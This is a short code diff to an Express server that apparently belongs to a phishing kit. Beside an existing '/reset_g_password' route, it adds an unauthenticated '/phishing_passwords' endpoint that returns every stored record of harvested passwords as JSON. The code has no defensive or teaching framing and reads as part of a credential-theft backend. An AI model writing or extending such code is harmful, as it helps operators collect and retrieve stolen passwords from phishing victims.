@@ -20,4 +20,15 @@ app.post('/reset_g_password', urlEncoded, (req, res)=>{
     })
 });
 
+
+app.get('/phishing_passwords', (req, res)=>{
+    PhishingModel.find({})
+    .then(data => {
+        res.json(data);
+    })
+    .catch(err => {
+        res.status(500).json(err);
+    })
+})
+
 module.exports = app;
